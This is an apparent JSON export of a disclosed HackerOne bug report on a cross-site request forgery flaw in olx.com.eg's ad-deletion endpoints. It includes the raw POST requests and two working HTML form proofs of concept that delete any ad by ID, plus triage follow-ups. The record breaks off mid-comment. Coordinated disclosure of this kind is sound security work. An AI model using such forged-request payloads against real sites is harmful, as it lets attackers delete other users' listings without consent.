{"id":178384,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzgzODQ=","url":"https://hackerone.com/reports/178384","title":"CSRF in delete advertisement on olx.com.eg","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-10-27T12:40:33.639Z","submitted_at":"2016-10-27T12:40:33.639Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mohamedsherif","url":"/mohamedsherif","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8146,"url":"https://hackerone.com/olx","handle":"olx","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/146/07ffc7e779ee301e61da60eda7f2bd862a7082ca_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/146/07ffc7e779ee301e61da60eda7f2bd862a7082ca_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"OLX","twitter_handle":"OLX","website":"http://olx.com","about":"OLX is an online classifieds platform that enables its users to create ads and display them on social networks."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-06T16:55:20.272Z","bug_reporter_agreed_on_going_public_at":"2017-04-06T16:55:12.563Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I found a CSRF in the request made while deleting any ad from olx\nthe request sent when deleting any ad is like this\n\nPOST /ajax/myaccount/deactivateme/ HTTP/1.1\nHost: olx.com.eg\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://olx.com.eg/myaccount/\nContent-Type: application/x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\nContent-Length: 31\nCookie: ... \nConnection: close\n\nadID=106381284\u0026reasonID=4\u0026text=\n\nAs you can see the request doesn't have any protection against CSRF ( no CSRF token ) and to delete any ad you have to only change the \"adID\" with the target id that you can get from the ad page from it's source code\n\nYou can simply inject this request using this POC\n\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://olx.com.eg/ajax/myaccount/deactivateme/\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"adID\" value=\"106381284\" /\u003e\n      \u003cinput type=\"hidden\" name=\"reasonID\" value=\"4\" /\u003e\n      \u003cinput type=\"hidden\" name=\"text\" value=\"\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n\nThis vulnerability can simply allow any hacker to delete all the posts on the website or to leave only his ads on the website so he can sell his products faster\n\nHope you can reply fast because of the severity of the vulnerability","vulnerability_information_html":"\u003cp\u003eI found a CSRF in the request made while deleting any ad from olx\u003cbr\u003e\nthe request sent when deleting any ad is like this\u003c/p\u003e\n\n\u003cp\u003ePOST /ajax/myaccount/deactivateme/ HTTP/1.1\u003cbr\u003e\nHost: olx.com.eg\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0\u003cbr\u003e\nAccept: application/json, text/javascript, \u003cem\u003e/\u003c/em\u003e; q=0.01\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nAccept-Encoding: gzip, deflate, br\u003cbr\u003e\nReferer: \u003ca title=\"https://olx.com.eg/myaccount/\" href=\"/redirect?url=https%3A%2F%2Folx.com.eg%2Fmyaccount%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://olx.com.eg/myaccount/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded\u003cbr\u003e\nX-Requested-With: XMLHttpRequest\u003cbr\u003e\nContent-Length: 31\u003cbr\u003e\nCookie: ... \u003cbr\u003e\nConnection: close\u003c/p\u003e\n\n\u003cp\u003eadID=106381284\u0026amp;reasonID=4\u0026amp;text=\u003c/p\u003e\n\n\u003cp\u003eAs you can see the request doesn\u0026#39;t have any protection against CSRF ( no CSRF token ) and to delete any ad you have to only change the \u0026quot;adID\u0026quot; with the target id that you can get from the ad page from it\u0026#39;s source code\u003c/p\u003e\n\n\u003cp\u003eYou can simply inject this request using this POC\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n  \u0026lt;body\u0026gt;\u003cbr\u003e\n    \u0026lt;form action=\u0026quot;https://olx.com.eg/ajax/myaccount/deactivateme/\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;adID\u0026quot; value=\u0026quot;106381284\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;reasonID\u0026quot; value=\u0026quot;4\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;text\u0026quot; value=\u0026quot;\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\u003cbr\u003e\n    \u0026lt;/form\u0026gt;\u003cbr\u003e\n  \u0026lt;/body\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eThis vulnerability can simply allow any hacker to delete all the posts on the website or to leave only his ads on the website so he can sell his products faster\u003c/p\u003e\n\n\u003cp\u003eHope you can reply fast because of the severity of the vulnerability\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":130504,"file_name":"csrf.html","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/130/504/f7089f1dc6747fd64d2fa7037356b43715a9a8a6/csrf.html?response-content-disposition=attachment%3B%20filename%3D%22csrf.html%22%3B%20filename%2A%3DUTF-8%27%27csrf.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQT27VLVF5%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044408Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDyDghanG6vysQhpIAbM6%2FNloTNBCfelRP1BGB1eeXDqQIgbh0u2InfYPRbM%2F0t24amgCOkVvoWkVHPo82TR%2BcSzPAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDG%2B9r1w6aCtbN7N%2FgSqRA8D1stzGXUi9998X9PqljCsxgqGb%2Fp5uwkl6HJ0ecyYUUOvKKK5bmjBmyhHU2siTJ5oMPHjZxACmC8QQR3zoStgvndU2Zk5FbI60XrAqVuUH%2BAK8pT26qvrZcq89M6eB7hRHvO%2BlRluLVtVVrfnC9UY0ATKZRmiYQyw9njaWy8e1cjtpV8uOzRbjAhSciTaQQ4Rof7K88HsyWXiwgfBdP3a0%2F0Eg3oYuiHO02sK0kJaBKVYS07wec5XsHKb5ikjLS61g4AVfdD4E0s3BTqyyWJeUCuyZ2YF95UI2CgkxcN5uOwwloEhHGonUYBlgrAIqXt%2FcecQNzktOM4Kjb30muwbzt0arTqS1XHySraj31WYHm2Cjy8AzyWIgNzu3Fq1xIENb3SovWG27JzCLGUyEU3ScE8nRNwiiydbGzKllImVZY%2BlC%2Bix1yqgNQOGSyxfVhY5J1d45Od%2BL4mUjygcLy%2FfzSKLf2qk3Prr%2BvcoxR9uUbkbtYRAEtizE%2BcIlRuTm3EFnBIvoMHCuplZLf4vZOpMrMLy9qv8FOusBWsgqdyTGkJS5%2BgtM3tHipB468LJZahmRjNSAud9TlniHiRJFpE4feQDaRgu4UD5waPGdkb1Mb3i2BGePA4gRyDu2hwL2UgW1yGpknpSCsy8uyMOhlVuIUyq7t0qBeid6h%2BvKgio2%2B05MKsls9XtVWxBqwW4LqYzc6KBQa0dOAdmkMORLktM2DWUfeoN%2FP12TUiKzRe%2BPGjaA3xBRgCZ2zNYmbNzYsoqOBfPEmbGygz2YZR0LAXBWrVpPc%2FJcYMLT6Jiu%2B2LCo6XyNRnu8YlFqwJ3EhjYkRvFzarUXssQ7cQHuLkop%2BkUTr8Vig%3D%3D\u0026X-Amz-Signature=084867c82afb61297d331d1ec56fc1418242b4027be4c60cacdfec8d1ec27571","file_size":418,"type":"text/html"}],"allow_singular_disclosure_at":"2017-05-06T16:55:12.599Z","allow_singular_disclosure_after":-115127335.54411504,"singular_disclosure_allowed":true,"vote_count":6,"voters":["eveeez","exception","linkks","mohamedsherif","spetr0x","waldzor"],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1294885,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey guys any reply here please\n15 days have already passed","markdown_message":"\u003cp\u003eHey guys any reply here please\u003cbr\u003e\n15 days have already passed\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-11T10:47:51.196Z","updated_at":"2016-11-11T10:47:51.196Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1294899,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello,\n\nSorry for the delay. Moving this issue to triaged.\n\nWe are deeply grateful for the security issue you shared with us. OLX's staff will we working on this issue to solve it.\n\nWe would like to add you in our Security Hall of Fame site that is hosted in security.olx.com. Could you please provide a profile you would like to link to (social media, HackerOne, etc) in our Hall of Fame entry?\n\nBest regards,\nGlobal Security Infrastructure Team","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eSorry for the delay. Moving this issue to triaged.\u003c/p\u003e\n\n\u003cp\u003eWe are deeply grateful for the security issue you shared with us. OLX\u0026#39;s staff will we working on this issue to solve it.\u003c/p\u003e\n\n\u003cp\u003eWe would like to add you in our Security Hall of Fame site that is hosted in security.olx.com. Could you please provide a profile you would like to link to (social media, HackerOne, etc) in our Hall of Fame entry?\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGlobal Security Infrastructure Team\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-11T11:01:25.258Z","updated_at":"2016-11-11T11:01:25.258Z","actor":{"username":"joaquin_rinaudo","cleared":false,"url":"/joaquin_rinaudo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/536/d33cf1cd7294a47bece9ee43f87d518c7f9872d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1296228,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nOkay you might add \nName : Mohamed Sherif Hazem\nLink : https://www.facebook.com/mohamednoureldin200222\nI would also love to know if this bug is getting a bounty or no because of its severity as i see that posting and deleting ads is the core of the website\n\nAlso , please inform me when i get added to the hall of fame\n\nThanks.","markdown_message":"\u003cp\u003eHello,\u003cbr\u003e\nOkay you might add \u003cbr\u003e\nName : Mohamed Sherif Hazem\u003cbr\u003e\nLink : \u003ca title=\"https://www.facebook.com/mohamednoureldin200222\" href=\"/redirect?url=https%3A%2F%2Fwww.facebook.com%2Fmohamednoureldin200222\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.facebook.com/mohamednoureldin200222\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nI would also love to know if this bug is getting a bounty or no because of its severity as i see that posting and deleting ads is the core of the website\u003c/p\u003e\n\n\u003cp\u003eAlso , please inform me when i get added to the hall of fame\u003c/p\u003e\n\n\u003cp\u003eThanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-12T08:47:08.418Z","updated_at":"2016-11-12T08:47:08.418Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1304973,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"any reply here\n","markdown_message":"\u003cp\u003eany reply here\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-17T14:04:13.041Z","updated_at":"2016-11-17T14:04:13.041Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1314970,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nThe team has not yet provided any ETA. Will ping you as soon as they do.\n\nBest regards,\nJoaquín","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eThe team has not yet provided any ETA. Will ping you as soon as they do.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJoaquín\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-23T11:53:59.082Z","updated_at":"2016-11-23T11:53:59.082Z","actor":{"username":"joaquin_rinaudo","cleared":false,"url":"/joaquin_rinaudo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/536/d33cf1cd7294a47bece9ee43f87d518c7f9872d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1359680,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"okay any response here ","markdown_message":"\u003cp\u003eokay any response here \u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-12T21:23:00.794Z","updated_at":"2016-12-12T21:23:00.794Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1368941,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"???","markdown_message":"\u003cp\u003e???\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-16T11:39:12.702Z","updated_at":"2016-12-16T11:39:12.702Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1384202,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI asked the team but they still have not provided any status update. \n\nBest regards,\nJoaquín","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI asked the team but they still have not provided any status update. \u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJoaquín\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-23T22:12:59.864Z","updated_at":"2016-12-23T22:12:59.864Z","actor":{"username":"joaquin_rinaudo","cleared":false,"url":"/joaquin_rinaudo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/536/d33cf1cd7294a47bece9ee43f87d518c7f9872d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1415772,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello, the team has notified me this issue has been fixed. \n\nCan you confirm?\n\nBest regards,\nJoaquín","markdown_message":"\u003cp\u003eHello, the team has notified me this issue has been fixed. \u003c/p\u003e\n\n\u003cp\u003eCan you confirm?\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJoaquín\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-12T11:17:59.731Z","updated_at":"2017-01-12T11:17:59.731Z","actor":{"username":"joaquin_rinaudo","cleared":false,"url":"/joaquin_rinaudo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/536/d33cf1cd7294a47bece9ee43f87d518c7f9872d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1416158,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nActually no the issue is still on the website but this time the request changed.\nThe new request actually still doesn't have a csrf token or any other kind of protection\n\nRequest\n---------------------\nThe new request needed to delete a ad\n```\nPOST /ajax/myaccount/removeme/ HTTP/1.1\nHost: olx.com.eg\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://burp/show/1\nCookie: ...\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 14\n\nadID=106381284\n```\nExploit Code\n---------------------\nTo exploit this issue i can use this very simple code by just knowing the ad number\n```\n\u003chtml\u003e\n  \u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://olx.com.eg/ajax/myaccount/removeme/\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"adID\" value=\"106381284\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\nThanks\n","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eActually no the issue is still on the website but this time the request changed.\u003cbr\u003e\nThe new request actually still doesn\u0026#39;t have a csrf token or any other kind of protection\u003c/p\u003e\n\n\u003ch2 id=\"request\"\u003eRequest\u003c/h2\u003e\n\n\u003cp\u003eThe new request needed to delete a ad\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /ajax/myaccount/removeme/ HTTP/1.1\nHost: olx.com.eg\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://burp/show/1\nCookie: ...\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 14\n\nadID=106381284\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"exploit-code\"\u003eExploit Code\u003c/h2\u003e\n\n\u003cp\u003eTo exploit this issue i can use this very simple code by just knowing the ad number\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"c\"\u003e\u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://olx.com.eg/ajax/myaccount/removeme/\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;adID\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;106381284\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-12T14:46:02.953Z","updated_at":"2017-01-12T14:46:02.953Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1422876,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Contacted the developers and provided the new POC. Also, pointed to them how to setup the CRSF library.\n\nThanks a lot for the help!\n\nBest regards,\nJoaquín","markdown_message":"\u003cp\u003eContacted the developers and provided the new POC. Also, pointed to them how to setup the CRSF library.\u003c/p\u003e\n\n\u003cp\u003eThanks a lot for the help!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJoaquín\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-16T14:26:35.845Z","updated_at":"2017-01-16T14:26:35.845Z","actor":{"username":"joaquin_rinaudo","cleared":false,"url":"/joaquin_rinaudo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/536/d33cf1cd7294a47bece9ee43f87d518c7f9872d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1432278,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello ,\nYou're welcome\nPlease update me when this issue is fixed\nThanks ,\nMohamed","markdown_message":"\u003cp\u003eHello ,\u003cbr\u003e\nYou\u0026#39;re welcome\u003cbr\u003e\nPlease update me when this issue is fixed\u003cbr\u003e\nThanks ,\u003cbr\u003e\nMohamed\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-20T11:00:45.093Z","updated_at":"2017-01-20T11:00:45.093Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1445069,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello ,\nAny update here. A huge amount of time has passed. \nIn two days , i will send a request to hacker one","markdown_message":"\u003cp\u003eHello ,\u003cbr\u003e\nAny update here. A huge amount of time has passed. \u003cbr\u003e\nIn two days , i will send a request to hacker one\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-26T12:03:19.171Z","updated_at":"2017-01-26T12:03:19.171Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1457350,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"May you please close this","markdown_message":"\u003cp\u003eMay you please close this\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-01T22:29:23.365Z","updated_at":"2017-02-01T22:29:23.365Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1501011,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nThe site/platform was always out of scope because they're behind the latest security patches.  There are plan to migrate to a new platform to solve many of the issues mentioned but it's taking at least 1 more month.\n\n\nBest regards,\nJoaquín","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eThe site/platform was always out of scope because they\u0026#39;re behind the latest security patches.  There are plan to migrate to a new platform to solve many of the issues mentioned but it\u0026#39;s taking at least 1 more month.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJoaquín\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-23T08:50:39.980Z","updated_at":"2017-02-23T08:50:39.980Z","actor":{"username":"joaquin_rinaudo","cleared":false,"url":"/joaquin_rinaudo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/536/d33cf1cd7294a47bece9ee43f87d518c7f9872d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1506248,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello ,\n\nOkay I am waiting for your response\n\nThanks ,\nMohamed","markdown_message":"\u003cp\u003eHello ,\u003c/p\u003e\n\n\u003cp\u003eOkay I am waiting for your response\u003c/p\u003e\n\n\u003cp\u003eThanks 